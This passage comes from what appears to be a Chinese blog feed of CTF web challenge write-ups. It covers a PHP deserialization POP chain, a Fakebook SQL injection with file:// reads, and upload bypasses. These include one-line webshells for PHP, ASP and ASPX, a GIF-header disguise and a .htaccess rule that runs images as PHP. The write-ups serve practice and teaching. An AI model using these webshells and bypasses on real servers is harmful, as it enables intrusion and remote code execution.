punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct：通过 file 给 source 赋值；当一个对象被实例化（new）时回调</p>\n<p>function __toString ()：返回 str 中的 source；当一个对象被当做字符串调用或输出时回调</p>\n<p>function __wakeup ()：过滤；在但序列化时自动回调</p>\n<p>思路：这三个方法看着没什么联系，但是却因为先后关系能被链起来。如果让 file 等于一个对象（实例化的 class）</p>\n<p>​\t\t\t那么在反序列化时调用的 wakeup 方法中，就会引起连锁反应（正则匹配会把 source 当成字符串）</p>\n<p>​\t\t\t从而调用了 tostring 方法，返回 str 中的 source</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Test<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct ()：将变量 p 变成一个数组；调用方法同前面</p>\n<p>function __get ()：调用了一个函数，名字为 function；访问私有属性或不存在的属性时，自动回调</p>\n<p>思路：提示的很明显，在 get 方法中，function 函数被调用</p>\n<p>​\t\t\t所以只要 function 是个对象，就会调用 class Modifier 中的 function __invoke ()，读取 flag</p>\n<p>​\t\t\t要让 function 为对象，只需要让 function __construct () 中的 <code>$this-&gt;p = new Modifier();</code></p>\n<p>​\t\t\t然后只需要 实例化 class Test 且触发__get () 方法 即可获得 flag</p>\n<p>​\t\t\t现在问题是，如何访问一个私有或不存在的属性触发 get？肯定是通过还没使用的 class show</p>\n<p>​\t\t\t根据 class show 中的结果，return 了一个 str 中的 source，那么当 str 被赋值为一个实例化对象后</p>\n<p>​\t\t\t只要该对象没有 source 属性，就可以触发__get () 方法，而刚好 Test 中没有 source。</p>\n<p>​\t\t\t而且让  <code>str = new Test()</code>  还能顺便实例化了 Test 类，同时满足了俩条件</p>\n<p>​\t\t\t至此，这一条链就连起来了！</p>\n<p>总结一下思路：</p>\n<p>​\t\t\t<strong>通过 show 的 __wakeup ()，调用__toString ()，调用 test 的__get ()，调用 Modifier 的__invoke ()</strong></p>\n<p>写代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>   <span class=\"token comment\">// 为了让 file 成一个对象，而不是一个数据，要调用两次</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 没法直接让 p 等于一个新的对象，需要通过方法来赋值</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fanqie'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 随便赋值，为了让 file 有值，否则会报错警告</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> str <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 让 str 等于一个类</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 再次调用，让 file 赋值成一个对象，触发__tostring ()，开始 pop 链</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 输出编码后的序列化字符串，带入 payload 就行</span></pre></td></tr></table></figure><p>将得到的值通过 get 传入，得到 base64 码，解码得到 flag</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/08/04/ctf/web/ssrf/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/",
            "url": "http://example.com/2021/08/04/ctf/web/ssrf/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/",
            "title": "(ctfwp)ssrf学习",
            "date_published": "2021-08-04T11:17:39.048Z",
            "content_html": "<p>学习一下 ssrf</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1网鼎杯-2018fakebook\"><a class=\"anchor\" href=\"#1网鼎杯-2018fakebook\">#</a> 1.[网鼎杯 2018] Fakebook</h1>\n<hr>\n<p>这题本来没做出来，搜了下 wp，学会了几种方法，并且大致认识了 ssrf。</p>\n<p>下面记录一下：</p>\n<hr>\n<p>进去找了找，发现有 sql 注入漏洞，并且能通过联合查询查到库名表明列名，但是最后显示序列化过的，也没有发现和 flag 相关的东西，遂没有思路了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvUlNHb1g0YWpsRUpzWjZDLnBuZw==\">https://i.loli.net/2021/08/04/RSGoX4ajlEJsZ6C.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvTlZadTQ3eEZCbk1MR0hiLnBuZw==\">https://i.loli.net/2021/08/04/NVZu47xFBnMLGHb.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvaE01OUVwWXdpVWFJeXFvLnBuZw==\">https://i.loli.net/2021/08/04/hM59EpYwiUaIyqo.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>看了 wp 后，发现了这个网站还有 robots.txt 文件，我压根没考虑那么多。。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvTGhBbE9Oems2Q2VzTXJLLnBuZw==\">https://i.loli.net/2021/08/04/LhAlONzk6CesMrK.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>根据大概意思可以猜测出，应该是 get 了一组信息在 blog 的位置，所以可以把需要 get 的信息写到 blog 位置，应该能出 flag，另外还要注意得用序列化的形式写</p>\n<p>把 txt 中前面的信息复制下来，根据题目中爆出来的文件路径，本地构造序列化内容，用 file 协议读：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvNkc1aG5FdVlmeEJrN0hJLnBuZw==\">https://i.loli.net/2021/08/04/6G5hnEuYfxBk7HI.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--P5--&gt;</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>no<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token comment\">/*!union*/</span> select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:1:\"1\";s:3:\"age\";i:10;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'</span></pre></td></tr></table></figure><p>在源码中读取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvZTZPem51eFhGRHlhOW9pLnBuZw==\">https://i.loli.net/2021/08/04/e6OznuxXFDya9oi.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<p>* 其他方法：</p>\n<p>通过 load_file 读取文件获取</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string-interpolation\"><span class=\"token string\">f\"if(ascii(substr((load_file('/var/www/html/flag.php')),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1,0)\"</span></span></pre></td></tr></table></figure><p>把 payload 带入盲注二分法程序中跑，能跑出来 flag，原理就是 load_file 能读取本地文件。</p>\n<p>还可以通过 load_file 注入一句话木马，用菜刀链接解：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMzQyMTQxL2FydGljbGUvZGV0YWlscy8xMDMyNTMxMjQ=\">SQL 注入一句话木马（load_file/out file</span></p>\n<hr>\n<p>遇到类似的再补充</p>\n<p>END</p>\n",
            "tags": [
                "SSRF"
            ]
        },
        {
            "id": "http://example.com/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "url": "http://example.com/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "title": "(ctfwp)upload类题目及蚁剑的运用",
            "date_published": "2021-08-02T13:26:51.812Z",
            "content_html": "<p>无聊刷题的时候遇到了点麻烦，经过学习后，认识了下中国蚁剑这款 np 的工具。</p>\n<p>结果没想到又遇到了 upload 类的题目，正好又用到了。。</p>\n<p>晕了，那就写一下，以后方便复习吧。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p>先从最简单的写起：</p>\n<h1 id=\"1极客大挑战-2019knife\"><a class=\"anchor\" href=\"#1极客大挑战-2019knife\">#</a> 1.[极客大挑战 2019] Knife</h1>\n<p>进去后就一个界面，再无数尝试后学习了下别人的 wp：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUFg4cjQ1S0hpbkFnbWtjLnBuZw==\">https://i.loli.net/2021/08/02/PX8r45KHinAgmkc.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>现在看来，确实提示的非常明显</p>\n<p>1. 题目为 knife，可以想到 <strong>中国菜刀</strong> 这个软件，他是 <strong>中国蚁剑</strong> 的前辈了。</p>\n<p>2. 中间有很明显得 一句话木马 的代码提示，可惜当时我还不知道。</p>\n<p>折腾半天后用 蚁剑 成功连接上网站，查看目录，flag 在根目录：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUmhXMkxzR3BBOHdvbktqLnBuZw==\">https://i.loli.net/2021/08/02/RhW2LsGpA8wonKj.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<hr>\n<h1 id=\"2actf2020-新生赛upload\"><a class=\"anchor\" href=\"#2actf2020-新生赛upload\">#</a> 2.[ACTF2020 新生赛] Upload</h1>\n<p>这道题稍微多了一点点难度：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvamhRbDRnTVB4WE9xRVI4LnBuZw==\">https://i.loli.net/2021/08/02/jhQl4gMPxXOqER8.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>1. 加了上传文件这个功能，查资料后我了解到了这类题的解题方法。</p>\n<p>2. 只能上传图片，无法直接解析代码，不能直接上传 php 来执行，需要绕过。</p>\n<p>3. 要学习一下 一句话木马。</p>\n<p>所以这里先复习一常用的一句话木马（原理、介绍太多就不写了）</p>\n<hr>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>最简单的一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php的一句话是:    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code class=\"language-asp\">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;\n</code></pre>\n<pre><code class=\"language-aspx\">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;\n</code></pre>\n<pre><code class=\"language-php+HTML\">phtml的一句话是:  &lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n\t\t\t\t&lt;?php @eval($_POST['flag']);?&gt;\n</code></pre>\n<p>第一个和第四个最常用，实测 [ ] 里面不用引号 ‘ ’ 也行。</p>\n<p>* 如果是图片还可以（我还没试成功过，但是有这个方法）:</p>\n<p>上传一个名字为 wooyun.jpg，内容为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?PHP</span> <span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[cmd])?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>的文件，然后访问 wooyun.jpg/.php, 在这个目录下就会生成一句话木马 shell.php</p>\n<hr>\n<p>继续本题 &gt;&gt;</p>\n<p>思路：先假装传图片，然后改格式为 php 或者其他的几个</p>\n<p>在本地写一个 txt，用 php 的一句话，后缀改为 jpg 传入，同时用 burp 抓包：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZlpUOHAzeW5YSXhyUGprLnBuZw==\">https://i.loli.net/2021/08/02/fZT8p3ynXIxrPjk.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>然后改后缀，文件格式保持不变，经过尝试，php 会报错，用 phtml 可以成功上传：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvdGZJVjZUTlh6RHdFQWRQLnBuZw==\">https://i.loli.net/2021/08/02/tfIV6TNXzDwEAdP.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>根据 unload 的位置，链接蚁剑，登录，在根目录获取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvaHhmVzQ5dXplMTdBbEt3LnBuZw==\">https://i.loli.net/2021/08/02/hxfW49uze17AlKw.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<h1 id=\"3极客大挑战-2019upload\"><a class=\"anchor\" href=\"#3极客大挑战-2019upload\">#</a> 3.[极客大挑战 2019] Upload</h1>\n<p>本题也是，只能上传图片格式，思路同上题一样，传一个 一句话木马 。</p>\n<p>本地写好后，抓包，改后缀 phtml（php 被 ban 了），发现 &lt;? 也被 ban 了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvRWVBZ25TSmNSbWR6SXRGLnBuZw==\">https://i.loli.net/2021/08/02/EeAgnSJcRmdzItF.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>试一下上面的第一个代码：</p>\n<pre><code class=\"language-php+HTML\">&lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvY2I3cnVHZXFvNFVwMVRCLnBuZw==\">https://i.loli.net/2021/08/02/cb7ruGeqo4Up1TB.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>发现还是能检测不是图片，在语句前加一个  <code>GIF86a</code>  伪装一下：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvNHlJdVFQWmhZSDFWS3p3LnBuZw==\">https://i.loli.net/2021/08/02/4yIuQPZhYH1VKzw.png</span>&quot; alt=&quot;9.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>可以发现成功上传，因为没有具体回显地址，又根据网址后面的后缀，可以猜测应该是上传到 upload 中：</p>\n<p><img data-src=\"https://i.loli.net/2021/08/02/jeQoCLwqA3vm5sn.png\" alt=\"10.png\">&lt;!--p10--&gt;</p>\n<p>果然，直接打开蚁剑：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWkNWa3ppdzFwbVdkU0h2LnBuZw==\">https://i.loli.net/2021/08/02/ZCVkziw1pmWdSHv.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWWpmVWlKdkk2Q2xtRmVuLnBuZw==\">https://i.loli.net/2021/08/02/YjfUiJvI6ClmFen.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<hr>\n<h1 id=\"4mrctf2020你传你呢\"><a class=\"anchor\" href=\"#4mrctf2020你传你呢\">#</a> 4.[MRCTF2020] 你传你🐎呢</h1>\n<p>这题前面的流程，思路和 2 一样，先伪造上传，然后改后缀</p>\n<p>但是再多次尝试后发现改后缀依旧被 ban，采用 3 的方法还是被 ban, 只能上传图片：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvSjQ2SUNrSHRVeUJYcVB3LnBuZw==\">https://i.loli.net/2021/08/02/J46ICkHtUyBXqPw.png</span>&quot; alt=&quot;13.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p13--&gt;</p>\n<p>再查阅资料后，发现是需要更改 htaccess 配置，将其他类型文件转为 php 文件</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> <strong>htaccess</strong></h2>\n<pre><code class=\"language-txt\">.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能\n</code></pre>\n<p>将下面的内容写入 .htaccess（注意没有名字，直接.htaccess!!!）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"flag.jpg\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>第一行要保证与需修改的文件同名</p>\n<p>（这个也行，这个意思是将 jpg 全当成 php）（注意没有名字，直接.htaccess!!!）</p>\n<pre><code>AddType application/x-httpd-php .jpg\n</code></pre>\n<p>随便选一个上传</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIveVUzY2diNnpTbmRIVEJSLnBuZw==\">https://i.loli.net/2021/08/02/yU3cgb6zSndHTBR.png</span>&quot; alt=&quot;14.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p14--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZnpUOUFsVk1STFp0UGp2LnBuZw==\">https://i.loli.net/2021/08/02/fzT9AlVMRLZtPjv.png</span>&quot; alt=&quot;15.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p15--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "upload"
            ]
        },
        {
            "id": "http://example.com/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "http://example.com/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "(ctfwp)sql堆叠注入及预编译的学习",
            "date_published": "2021-08-01T07:01:31.153Z",
